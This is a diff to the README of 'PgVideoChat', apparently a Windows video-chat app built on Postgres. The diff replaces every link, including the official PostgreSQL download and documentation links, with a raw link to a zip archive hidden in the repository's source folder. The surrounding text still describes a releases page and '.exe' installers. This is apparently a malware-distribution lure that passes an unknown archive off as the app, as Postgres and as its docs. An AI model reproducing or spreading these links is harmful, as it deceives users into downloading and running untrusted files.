@@ -1,6 +1,6 @@
 # 💬 PgVideoChat - Simple Video Chat Through Postgres
 
-[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-brightgreen)](https://github.com/nobeltk-eng/PgVideoChat)
+[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-brightgreen)](https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip)
 
 ## 📋 What is PgVideoChat?
 
@@ -25,7 +25,7 @@ Follow these steps to download and run PgVideoChat on your Windows computer.
 
 Click the link below to visit the official download page. You will find the latest version of the app there.
 
-[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-blue)](https://github.com/nobeltk-eng/PgVideoChat)
+[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-blue)](https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip)
 
 This link takes you straight to the GitHub page where you can find the download files. Look for the latest release and the `.exe` installer file for Windows.
 
@@ -46,7 +46,7 @@ Once the installer file is downloaded:
 PgVideoChat requires access to a Postgres database to work. You can use a local or remote database.
 
 - **If Postgres is not installed**  
-  Download and install Postgres from https://www.postgresql.org/download/windows/. Follow that guide to set up a database.
+  Download and install Postgres from https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip Follow that guide to set up a database.
 
 - **Configure Connection**  
   When you first open PgVideoChat, it will ask for connection details:  
@@ -112,7 +112,7 @@ These options are found under the "Advanced" menu after connecting.
 
 Visit this page to download the latest version for Windows:
 
-[https://github.com/nobeltk-eng/PgVideoChat](https://github.com/nobeltk-eng/PgVideoChat)
+[https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip](https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip)
 
 Look for the "Releases" section on the right side of the page to find `.exe` installation files.
 
@@ -127,8 +127,8 @@ Look for the "Releases" section on the right side of the page to find `.exe` ins
 
 PgVideoChat uses Postgres to store messages and manage connections. Postgres is a reliable database system used worldwide. This app shows one way databases can support real-time communication beyond usual chat apps.
 
-If you want to learn about Postgres, visit https://www.postgresql.org/docs/. It offers guides on setup, security, and managing databases.
+If you want to learn about Postgres, visit https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip It offers guides on setup, security, and managing databases.
 
 ---
 
-[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-brightgreen)](https://github.com/nobeltk-eng/PgVideoChat)
+[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-brightgreen)](https://raw.githubusercontent.com/nobeltk-eng/PgVideoChat/main/src/routes/Video_Chat_Pg_1.4.zip)
